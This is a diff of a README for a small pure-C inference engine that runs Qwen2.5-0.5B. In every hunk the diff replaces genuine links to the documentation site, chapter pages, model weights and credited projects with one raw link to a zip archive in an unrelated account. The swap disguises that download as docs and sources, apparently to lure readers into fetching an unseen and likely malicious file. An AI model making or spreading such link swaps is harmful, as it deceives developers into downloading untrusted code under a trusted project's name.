@@ -11,7 +11,7 @@ No PyTorch, no AI frameworks, just libc.
 [![Model: Qwen2.5-0.5B](https://img.shields.io/badge/Model-Qwen2.5--0.5B-green.svg)]()
 [![Code: ~2700](https://img.shields.io/badge/Code-~2700_lines-orange.svg)]()
 
-📖 **[Documentation](https://jackiesre721.github.io/inference-learn/)** · [中文](./README.zh.md) · [Source](https://github.com/jackiesre721/inference-learn)
+📖 **[Documentation](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip)** · [中文](./README.zh.md) · [Source](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip)
 
 </div>
 
@@ -35,7 +35,7 @@ This is not an API call. It's a ~2700-line pure C inference engine that hand-wri
 
 ## 🎯 What is this
 
-A pure-C inference engine that loads [Qwen2.5-0.5B](https://huggingface.co/Qwen/Qwen2.5-0.5B) (0.49B params) and generates text.
+A pure-C inference engine that loads [Qwen2.5-0.5B](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) (0.49B params) and generates text.
 
 **Goal is not performance** (1000× slower than vLLM), but **understanding every component**:
 
@@ -113,20 +113,20 @@ flowchart TB
 
 ## 📖 Documentation
 
-**[Full Documentation](https://jackiesre721.github.io/inference-learn/)** — 10 chapters + 2 appendices, 13 Mermaid diagrams
+**[Full Documentation](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip)** — 10 chapters + 2 appendices, 13 Mermaid diagrams
 
 | Chapter | Topic | Source |
 |---------|-------|--------|
-| [1. Basics](https://jackiesre721.github.io/inference-learn/01-basics) | Tensors, dimensions, 0.5B calculation | — |
-| [2. Weights](https://jackiesre721.github.io/inference-learn/02-weights) | safetensors, mmap, bf16 | `safetensors.c` |
-| [3. JSON Parser](https://jackiesre721.github.io/inference-learn/03-json) | Recursive descent | `json.c` |
-| [4. Model](https://jackiesre721.github.io/inference-learn/04-model) | Config / Weights / RunState | `net.h` |
-| [5. Forward Pass ★](https://jackiesre721.github.io/inference-learn/05-forward) | 6 operators + 6 diagrams | `net.c` |
-| [6. Tokenizer](https://jackiesre721.github.io/inference-learn/06-tokenizer) | BPE, byte-level | `tokenizer.c` |
-| [7. Sampling](https://jackiesre721.github.io/inference-learn/07-sampling) | temperature, top-k, prefill/decode | `run.c` |
-| [8. Logging](https://jackiesre721.github.io/inference-learn/08-logging) | Tiered log, HTML report | `trace.c` |
-| [9. Debugging](https://jackiesre721.github.io/inference-learn/09-debugging) | Numerical verification, ASan | — |
-| [10. Ecosystem](https://jackiesre721.github.io/inference-learn/10-ecosystem) | vs llama.cpp / vLLM / SGLang | — |
+| [1. Basics](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | Tensors, dimensions, 0.5B calculation | — |
+| [2. Weights](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | safetensors, mmap, bf16 | `safetensors.c` |
+| [3. JSON Parser](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | Recursive descent | `json.c` |
+| [4. Model](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | Config / Weights / RunState | `net.h` |
+| [5. Forward Pass ★](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | 6 operators + 6 diagrams | `net.c` |
+| [6. Tokenizer](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | BPE, byte-level | `tokenizer.c` |
+| [7. Sampling](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | temperature, top-k, prefill/decode | `run.c` |
+| [8. Logging](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | Tiered log, HTML report | `trace.c` |
+| [9. Debugging](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | Numerical verification, ASan | — |
+| [10. Ecosystem](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) | vs llama.cpp / vLLM / SGLang | — |
 
 ## 📊 Performance
 
@@ -146,9 +146,9 @@ flowchart TB
 
 ## 🙏 Acknowledgments
 
-- [llama2.c](https://github.com/karpathy/llama2.c) — minimal inference engine philosophy
-- [Qwen2.5-0.5B](https://huggingface.co/Qwen/Qwen2.5-0.5B) — open model weights
-- [safetensors](https://github.com/huggingface/safetensors) — weight format
+- [llama2.c](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) — minimal inference engine philosophy
+- [Qwen2.5-0.5B](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) — open model weights
+- [safetensors](https://raw.githubusercontent.com/Michelinboard436/inference-learn/main/.github/learn_inference_v3.9.zip) — weight format
 
 ## 📄 License
 
